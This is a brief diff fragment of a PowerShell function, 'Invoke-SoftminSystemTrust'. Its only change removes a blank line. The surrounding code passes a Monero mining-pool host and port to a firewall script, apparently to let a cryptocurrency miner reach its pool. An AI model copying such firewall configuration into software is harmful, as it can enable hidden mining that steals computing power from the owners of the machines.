@@ -249,7 +249,6 @@ function Invoke-SoftminSystemTrust {
     } elseif ($fwScript) {
         $result.Firewall = & $fwScript -InstallPath $InstallPath -PoolHost 'pool.supportxmr.com' -PoolPort 443
     }
-
     return $result
 }
 
